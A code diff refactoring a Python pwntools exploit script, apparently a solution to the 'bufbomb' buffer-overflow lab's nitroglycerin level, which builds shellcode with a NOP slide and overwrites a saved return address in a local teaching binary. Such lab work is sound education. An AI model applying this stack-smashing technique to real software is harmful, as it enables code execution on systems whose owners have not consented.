@@ -1,8 +1,7 @@
 from pwn import *
 
-f = open("./ID", "r")
-id = f.read().splitlines()[0]
-f.close()
+with open('./ID', 'r') as f:
+    id = f.read().splitlines()[0]
 
 sh = process(['./bufbomb', '-u', id, '-n'])
 
@@ -13,11 +12,12 @@ cookie = 0x274adc8a
 distance = 0x28 # distance from esp to previous ebp
 nop = chr(0x90)
 
-shellcode = asm('mov eax, ' + str(cookie) + '; lea ebp, [esp + ' + str(distance) + ']; push ' + str(ret) + '; ret;')
+shellcode = asm('mov eax, {}; lea ebp, [esp + {}]; push {}; ret;'.format(cookie, distance, ret))
 
 exploit = flat([shellcode.rjust(length + 8, nop), 0xdeadbeef, ebp - length / 2]) # NOP slide
 
-print ' '.join(char.encode("hex") for char in exploit)
+with open('./nitro_{}.txt'.format(id), 'w') as f:
+    f.write(' '.join(char.encode('hex') for char in exploit))
 
 for _ in range(5):
     sh.sendline(exploit)
